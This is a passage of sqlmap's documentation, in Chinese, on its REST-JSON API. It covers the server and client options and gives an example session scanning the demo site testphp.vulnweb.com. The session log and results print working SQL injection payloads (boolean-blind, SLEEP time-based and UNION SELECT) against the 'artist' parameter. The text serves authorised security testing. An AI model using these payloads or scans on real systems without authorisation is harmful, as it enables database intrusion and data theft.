## API (REST-JSON)

sqlmap 可以通过 REST-JSON API 运行，即使用 JSON 格式的 REST（REpresentational State Transfer 的缩写）风格的 API 来进行服务器和客户端实例之间的通信。直白地讲，服务器使用 sqlmap 进行扫描，而客户端设置 sqlmap 选项/开关并将结果拉取回来。用于运行 API 的主程序文件是 `sqlmapapi.py`，而客户端可以在任意用户程序中进行实现。

```
$ python sqlmapapi.py -hh
Usage: sqlmapapi.py [options]

Options:
  -h, --help            show this help message and exit
  -s, --server          Act as a REST-JSON API server
  -c, --client          Act as a REST-JSON API client
  -H HOST, --host=HOST  Host of the REST-JSON API server (default "127.0.0.1")
  -p PORT, --port=PORT  Port of the the REST-JSON API server (default 8775)
  --adapter=ADAPTER     Server (bottle) adapter to use (default "wsgiref")
```

通过使用开关 `-s` 运行 `sqlmapapi.py` 启用服务器，使用开关 `-c` 启用客户端，在这两种情况下，用户可以（可选）使用选项 `-H`（默认为 `"127.0.0.1"`）和选项 `-p`（默认为 `8775`）设置监听的 IP 地址和端口。每个客户端的“会话”可以有多个“任务”（例如：运行 sqlmap 扫描），用户可以任意选择某个任务处于当前活动状态。

客户端命令行界面可用的命令有：

* `help` - 显示可用命令列表以及基本的帮助信息
* `new ARGS` - 使用提供的参数开始一次新的扫描任务（例如：`new -u "http://testphp.vulnweb.com/artists.php?artist=1"`）
* `use TASKID` - 切换当前上下文到不同任务（例如：`use c04d8c5c7582efb4`）
* `data` - 获取并显示当前任务的数据
* `log`- 获取并显示当前任务日志
* `status` - 获取并显示当前任务状态
* `stop` - 停止当前任务
* `kill` - 杀死当前任务
* `list` - 显示所有任务（当前会话）
* `flush` - 清空所有任务（例如：deletes）
* `exit` - 退出客户端界面

运行服务器的示例：

```
$ python sqlmapapi.py -s -H "0.0.0.0"
[12:47:51] [INFO] Running REST-JSON API server at '0.0.0.0:8775'..
[12:47:51] [INFO] Admin ID: 89fd118997840a9bd7fc329ab535b881
[12:47:51] [DEBUG] IPC database: /tmp/sqlmapipc-SzBQnd
[12:47:51] [DEBUG] REST-JSON API server connected to IPC database
[12:47:51] [DEBUG] Using adapter 'wsgiref' to run bottle
[12:48:10] [DEBUG] Created new task: 'a42ddaef02e976f0'
[12:48:10] [DEBUG] [a42ddaef02e976f0] Started scan
[12:48:16] [DEBUG] [a42ddaef02e976f0] Retrieved scan status
[12:48:50] [DEBUG] [a42ddaef02e976f0] Retrieved scan status
[12:48:55] [DEBUG] [a42ddaef02e976f0] Retrieved scan log messages
[12:48:59] [DEBUG] [a42ddaef02e976f0] Retrieved scan data and error messages
```

运行客户端的示例：

```
$ python sqlmapapi.py -c -H "192.168.110.1"
[12:47:53] [DEBUG] Example client access from command line:
    $ taskid=$(curl http://192.168.110.1:8775/task/new 2>1 | grep -o -I '[a-f0-9
]\{16\}') && echo $taskid
    $ curl -H "Content-Type: application/json" -X POST -d '{"url": "http://testp
hp.vulnweb.com/artists.php?artist=1"}' http://192.168.110.1:8775/scan/$taskid/st
art
    $ curl http://192.168.110.1:8775/scan/$taskid/data
    $ curl http://192.168.110.1:8775/scan/$taskid/log
[12:47:53] [INFO] Starting REST-JSON API client to 'http://192.168.110.1:8775'..
.
[12:47:53] [DEBUG] Calling http://192.168.110.1:8775
[12:47:53] [INFO] Type 'help' or '?' for list of available commands
api> ?
help        Show this help message
new ARGS    Start a new scan task with provided arguments (e.g. 'new -u "http://
testphp.vulnweb.com/artists.php?artist=1"')
use TASKID  Switch current context to different task (e.g. 'use c04d8c5c7582efb4
')
data        Retrieve and show data for current task
log         Retrieve and show log for current task
status      Retrieve and show status for current task
stop        Stop current task
kill        Kill current task
list        Display all tasks
flush       Flush tasks (delete all tasks)
exit        Exit this client
api> new -u "http://testphp.vulnweb.com/artists.php?artist=1" --banner --flush-s
ession
[12:48:10] [DEBUG] Calling http://192.168.110.1:8775/task/new
[12:48:10] [INFO] New task ID is 'a42ddaef02e976f0'
[12:48:10] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/start
[12:48:10] [INFO] Scanning started
api (a42ddaef02e976f0)> status
[12:48:16] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/statu
s
{
    "status": "running",
    "returncode": null,
    "success": true
}
api (a42ddaef02e976f0)> status
[12:48:50] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/statu
s
{
    "status": "terminated",
    "returncode": 0,
    "success": true
}
api (a42ddaef02e976f0)> log
[12:48:55] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/log
{
    "log": [
        {
            "message": "flushing session file",
            "level": "INFO",
            "time": "12:48:10"
        },
        {
            "message": "testing connection to the target URL",
            "level": "INFO",
            "time": "12:48:10"
        },
        {
            "message": "checking if the target is protected by some kind of WAF/
IPS/IDS",
            "level": "INFO",
            "time": "12:48:10"
        },
        {
            "message": "testing if the target URL is stable",
            "level": "INFO",
            "time": "12:48:10"
        },
        {
            "message": "target URL is stable",
            "level": "INFO",
            "time": "12:48:11"
        },
        {
            "message": "testing if GET parameter 'artist' is dynamic",
            "level": "INFO",
            "time": "12:48:11"
        },
        {
            "message": "confirming that GET parameter 'artist' is dynamic",
            "level": "INFO",
            "time": "12:48:11"
        },
        {
            "message": "GET parameter 'artist' is dynamic",
            "level": "INFO",
            "time": "12:48:11"
        },
        {
            "message": "heuristic (basic) test shows that GET parameter 'artist'
 might be injectable (possible DBMS: 'MySQL')",
            "level": "INFO",
            "time": "12:48:11"
        },
        {
            "message": "testing for SQL injection on GET parameter 'artist'",
            "level": "INFO",
            "time": "12:48:11"
        },
        {
            "message": "testing 'AND boolean-based blind - WHERE or HAVING claus
e'",
            "level": "INFO",
            "time": "12:48:11"
        },
        {
            "message": "GET parameter 'artist' appears to be 'AND boolean-based
blind - WHERE or HAVING clause' injectable (with --string=\"hac\")",
            "level": "INFO",
            "time": "12:48:12"
        },
        {
            "message": "testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, O
RDER BY or GROUP BY clause (BIGINT UNSIGNED)'",
            "level": "INFO",
            "time": "12:48:12"
        },
        {
            "message": "testing 'MySQL >= 5.5 OR error-based - WHERE, HAVING cla
use (BIGINT UNSIGNED)'",
            "level": "INFO",
            "time": "12:48:12"
        },
        {
            "message": "testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, O
RDER BY or GROUP BY clause (EXP)'",
            "level": "INFO",
            "time": "12:48:12"
        },
        {
            "message": "testing 'MySQL >= 5.5 OR error-based - WHERE, HAVING cla
use (EXP)'",
            "level": "INFO",
            "time": "12:48:12"
        },
        {
            "message": "testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING,
 ORDER BY or GROUP BY clause (JSON_KEYS)'",
            "level": "INFO",
            "time": "12:48:12"
        },
        {
            "message": "testing 'MySQL >= 5.7.8 OR error-based - WHERE, HAVING c
lause (JSON_KEYS)'",
            "level": "INFO",
            "time": "12:48:12"
        },
        {
            "message": "testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, O
RDER BY or GROUP BY clause (FLOOR)'",
            "level": "INFO",
            "time": "12:48:12"
        },
        {
            "message": "testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, OR
DER BY or GROUP BY clause (FLOOR)'",
            "level": "INFO",
            "time": "12:48:12"
        },
        {
            "message": "testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, O
RDER BY or GROUP BY clause (EXTRACTVALUE)'",
            "level": "INFO",
            "time": "12:48:12"
        },
        {
            "message": "testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, OR
DER BY or GROUP BY clause (EXTRACTVALUE)'",
            "level": "INFO",
            "time": "12:48:12"
        },
        {
            "message": "testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, O
RDER BY or GROUP BY clause (UPDATEXML)'",
            "level": "INFO",
            "time": "12:48:12"
        },
        {
            "message": "testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, OR
DER BY or GROUP BY clause (UPDATEXML)'",
            "level": "INFO",
            "time": "12:48:12"
        },
        {
            "message": "testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, O
RDER BY or GROUP BY clause (FLOOR)'",
            "level": "INFO",
            "time": "12:48:12"
        },
        {
            "message": "testing 'MySQL >= 4.1 OR error-based - WHERE, HAVING cla
use (FLOOR)'",
            "level": "INFO",
            "time": "12:48:12"
        },
        {
            "message": "testing 'MySQL OR error-based - WHERE or HAVING clause (
FLOOR)'",
            "level": "INFO",
            "time": "12:48:12"
        },
        {
            "message": "testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (E
XTRACTVALUE)'",
            "level": "INFO",
            "time": "12:48:12"
        },
        {
            "message": "testing 'MySQL >= 5.5 error-based - Parameter replace (B
IGINT UNSIGNED)'",
            "level": "INFO",
            "time": "12:48:12"
        },
        {
            "message": "testing 'MySQL >= 5.5 error-based - Parameter replace (E
XP)'",
            "level": "INFO",
            "time": "12:48:12"
        },
        {
            "message": "testing 'MySQL >= 5.7.8 error-based - Parameter replace
(JSON_KEYS)'",
            "level": "INFO",
            "time": "12:48:12"
        },
        {
            "message": "testing 'MySQL >= 5.0 error-based - Parameter replace (F
LOOR)'",
            "level": "INFO",
            "time": "12:48:13"
        },
        {
            "message": "testing 'MySQL >= 5.1 error-based - Parameter replace (U
PDATEXML)'",
            "level": "INFO",
            "time": "12:48:13"
        },
        {
            "message": "testing 'MySQL >= 5.1 error-based - Parameter replace (E
XTRACTVALUE)'",
            "level": "INFO",
            "time": "12:48:13"
        },
        {
            "message": "testing 'MySQL inline queries'",
            "level": "INFO",
            "time": "12:48:13"
        },
        {
            "message": "testing 'MySQL > 5.0.11 stacked queries (comment)'",
            "level": "INFO",
            "time": "12:48:13"
        },
        {
            "message": "testing 'MySQL > 5.0.11 stacked queries'",
            "level": "INFO",
            "time": "12:48:13"
        },
        {
            "message": "testing 'MySQL > 5.0.11 stacked queries (query SLEEP - c
omment)'",
            "level": "INFO",
            "time": "12:48:13"
        },
        {
            "message": "testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'",
            "level": "INFO",
            "time": "12:48:13"
        },
        {
            "message": "testing 'MySQL < 5.0.12 stacked queries (heavy query - c
omment)'",
            "level": "INFO",
            "time": "12:48:13"
        },
        {
            "message": "testing 'MySQL < 5.0.12 stacked queries (heavy query)'",
            "level": "INFO",
            "time": "12:48:13"
        },
        {
            "message": "testing 'MySQL >= 5.0.12 AND time-based blind'",
            "level": "INFO",
            "time": "12:48:13"
        },
        {
            "message": "GET parameter 'artist' appears to be 'MySQL >= 5.0.12 AN
D time-based blind' injectable ",
            "level": "INFO",
            "time": "12:48:23"
        },
        {
            "message": "testing 'Generic UNION query (NULL) - 1 to 20 columns'",
            "level": "INFO",
            "time": "12:48:23"
        },
        {
            "message": "automatically extending ranges for UNION query injection
 technique tests as there is at least one other (potential) technique found",
            "level": "INFO",
            "time": "12:48:23"
        },
        {
            "message": "'ORDER BY' technique appears to be usable. This should r
educe the time needed to find the right number of query columns. Automatically e
xtending the range for current UNION query injection technique test",
            "level": "INFO",
            "time": "12:48:23"
        },
        {
            "message": "target URL appears to have 3 columns in query",
            "level": "INFO",
            "time": "12:48:23"
        },
        {
            "message": "GET parameter 'artist' is 'Generic UNION query (NULL) -
1 to 20 columns' injectable",
            "level": "INFO",
            "time": "12:48:24"
        },
        {
            "message": "the back-end DBMS is MySQL",
            "level": "INFO",
            "time": "12:48:24"
        },
        {
            "message": "fetching banner",
            "level": "INFO",
            "time": "12:48:24"
        }
    ],
    "success": true
}
api (a42ddaef02e976f0)> data
[12:48:59] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/data
{
    "data": [
        {
            "status": 1,
            "type": 0,
            "value": [
                {
                    "dbms": "MySQL",
                    "suffix": "",
                    "clause": [
                        1,
                        9
                    ],
                    "notes": [],
                    "ptype": 1,
                    "dbms_version": [
                        ">= 5.0.12"
                    ],
                    "prefix": "",
                    "place": "GET",
                    "os": null,
                    "conf": {
                        "code": null,
                        "string": "hac",
                        "notString": null,
                        "titles": false,
                        "regexp": null,
                        "textOnly": false,
                        "optimize": false
                    },
                    "parameter": "artist",
                    "data": {
                        "1": {
                            "comment": "",
                            "matchRatio": 0.85,
                            "trueCode": 200,
                            "title": "AND boolean-based blind - WHERE or HAVING
clause",
                            "templatePayload": null,
                            "vector": "AND [INFERENCE]",
                            "falseCode": 200,
                            "where": 1,
                            "payload": "artist=1 AND 2794=2794"
                        },
                        "5": {
                            "comment": "",
                            "matchRatio": 0.85,
                            "trueCode": 200,
                            "title": "MySQL >= 5.0.12 AND time-based blind",
                            "templatePayload": null,
                            "vector": "AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLE
EPTIME]),[RANDNUM])",
                            "falseCode": null,
                            "where": 1,
                            "payload": "artist=1 AND SLEEP([SLEEPTIME])"
                        },
                        "6": {
                            "comment": "[GENERIC_SQL_COMMENT]",
                            "matchRatio": 0.85,
                            "trueCode": null,
                            "title": "Generic UNION query (NULL) - 1 to 20 colum
ns",
                            "templatePayload": null,
                            "vector": [
                                2,
                                3,
                                "[GENERIC_SQL_COMMENT]",
                                "",
                                "",
                                "NULL",
                                2,
                                false,
                                false
                            ],
                            "falseCode": null,
                            "where": 2,
                            "payload": "artist=-5376 UNION ALL SELECT NULL,NULL,
CONCAT(0x716b706a71,0x4a754d495377744d4273616c436b4b6a504164666a5572477241596649
704c68614672644a477474,0x7162717171)-- aAjy"
                        }
                    }
                }
            ]
        },
        {
            "status": 1,
            "type": 2,
            "value": "5.1.73-0ubuntu0.10.04.1"
        }
    ],
    "success": true,
    "error": []
}
api (a42ddaef02e976f0)> exit
$
```